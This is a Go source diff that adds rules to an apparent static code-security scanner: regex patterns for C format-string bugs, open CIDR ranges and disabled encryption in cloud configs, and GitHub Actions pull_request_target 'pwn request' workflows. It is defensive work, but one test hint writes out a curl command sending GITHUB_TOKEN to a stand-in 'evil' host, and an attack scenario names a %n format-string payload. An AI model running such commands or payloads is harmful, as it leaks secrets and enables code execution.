@@ -343,6 +343,41 @@ var generatedRules = []Rule{
 		},
 	},
 	{
+		CWE:          "CWE-134",
+		Name:         "Uncontrolled format string (variable passed as the format argument)",
+		Rank:         0,
+		KEV:          false,
+		OWASP:        nil,
+		Severity:     "",
+		TaskTriggers: []string{"printf", "log message", "format", "error message", "syslog"},
+		Patterns: []Pattern{
+			{
+				Lang:       "c",
+				Re:         "\\b(?:printf|vprintf)\\s*\\(\\s*[A-Za-z_]\\w*\\s*\\)",
+				Confidence: "high",
+				prefilter:  []string{"printf", "vprintf"},
+			},
+			{
+				Lang:       "c",
+				Re:         "\\b(?:fprintf|dprintf|vfprintf|syslog)\\s*\\(\\s*[A-Za-z_]\\w*\\s*,\\s*[A-Za-z_]\\w*\\s*\\)",
+				Confidence: "medium",
+				prefilter:  []string{"fprintf", "dprintf", "vfprintf", "syslog"},
+			},
+		},
+		Absence:        nil,
+		AttackScenario: "Attacker-controlled text reaches printf/fprintf/syslog as the format string instead of as an argument; a payload of %x%x%n reads the stack and writes an attacker-chosen value to an attacker-chosen address, giving an arbitrary-write primitive and RCE (classic format-string bug).",
+		NegativeHints:  []string{"pass the string \"%n%n%n%n\" as the message and assert it is printed literally via a fixed \"%s\" format, never interpreted as format directives"},
+		Exemplar: struct {
+			Noncompliant string `json:"noncompliant"`
+			Compliant    string `json:"compliant"`
+			Explanation  string `json:"explanation"`
+		}{
+			Noncompliant: "fprintf(stderr, user_msg);",
+			Compliant:    "fprintf(stderr, \"%s\", user_msg);",
+			Explanation:  "A bare identifier in the format position lets attacker input carry %n/%s directives. Always pass a fixed \"%s\" literal and the data as an argument. Single-arg printf(x) and 2-arg fprintf(f,x)/syslog(p,x) with no literal format are matched; any call whose format position is a string literal stays clean.",
+		},
+	},
+	{
 		CWE:          "CWE-190",
 		Name:         "Integer overflow in allocation size (unchecked multiplication into malloc/realloc)",
 		Rank:         0,
@@ -4216,6 +4251,18 @@ var generatedRules = []Rule{
 				Confidence: "high",
 				prefilter:  []string{"publicly_accessible"},
 			},
+			{
+				Lang:       "",
+				Re:         "(?im)[\"']?Cidr(?:Ip|Ipv6)[\"']?\\s*:\\s*[\"']?(?:0\\.0\\.0\\.0/0|::/0)",
+				Confidence: "high",
+				prefilter:  []string{"cidr"},
+			},
+			{
+				Lang:       "",
+				Re:         "(?im)[\"']?(?:StorageEncrypted|Encrypted)[\"']?\\s*:\\s*[\"']?false\\b",
+				Confidence: "high",
+				prefilter:  []string{"false"},
+			},
 		},
 		Absence:        []string{"Session/auth cookies should set HttpOnly, Secure, and SameSite=Lax|Strict; confirm these flags are present.", "Serve security headers by default (Content-Security-Policy, X-Content-Type-Options, HSTS) — a missing header is not visible in one hunk.", "Create files and temp files with least-privilege permissions (0600/0640), never world-writable."},
 		AttackScenario: "an insecure default (world-writable files, an obsolete TLS version, a cookie without HttpOnly/Secure) leaves a gap the framework would have closed by default — a local user tampers with the file, a network attacker downgrades TLS, or JavaScript steals the session cookie",
@@ -5598,6 +5645,35 @@ var generatedRules = []Rule{
 			Noncompliant: "function forward(address impl, bytes calldata data) external {\n  impl.delegatecall(data);\n}",
 			Compliant:    "// call a fixed, audited contract through its typed interface, never raw delegatecall on caller data\nfunction upgrade(uint version) external onlyOwner {\n  IAudited(TRUSTED).performUpgrade(version);\n}",
 			Explanation:  "do not delegatecall (or forward calldata to) a caller-controlled address; invoke a fixed, audited contract through its interface behind access control, and avoid selfdestruct",
+		},
+	},
+	{
+		CWE:          "CWE-829",
+		Name:         "GitHub Actions pwn-request: pull_request_target checks out untrusted PR head",
+		Rank:         0,
+		KEV:          false,
+		OWASP:        nil,
+		Severity:     "",
+		TaskTriggers: []string{"github actions", "workflow", "pull_request_target", "checkout", "ci", "fork pr"},
+		Patterns: []Pattern{
+			{
+				Lang:       "yaml",
+				Re:         "(?s)pull_request_target[\\s\\S]{0,1000}?\\bref:\\s*['\"]?\\$\\{\\{\\s*github\\.event\\.pull_request\\.head\\.(?:sha|ref)",
+				Confidence: "high",
+				prefilter:  []string{"pull_request_target"},
+			},
+		},
+		Absence:        nil,
+		AttackScenario: "A workflow triggered by pull_request_target runs with a read-write GITHUB_TOKEN and repository secrets, then checks out the fork's PR head and builds/tests it; the attacker's malicious build script or test step exfiltrates the secrets or pushes to the repo.",
+		NegativeHints:  []string{"open a fork PR whose build step runs \"curl -d @$GITHUB_TOKEN https://evil\" and assert the workflow never checks out or executes the PR head under the privileged pull_request_target token"},
+		Exemplar: struct {
+			Noncompliant string `json:"noncompliant"`
+			Compliant    string `json:"compliant"`
+			Explanation  string `json:"explanation"`
+		}{
+			Noncompliant: "on: pull_request_target\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}",
+			Compliant:    "on: pull_request\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4",
+			Explanation:  "pull_request_target runs in the base-repo trust context (secrets + a write-scoped token) but is intended to check out only trusted base code. Explicitly checking out github.event.pull_request.head.(sha|ref) pulls attacker-controlled fork code into that privileged context - the canonical 'pwn request'. The two-signal regex requires BOTH the trigger and the untrusted-head checkout, so plain pull_request (read-only token) and base-only checkouts stay clean.",
 		},
 	},
 	{
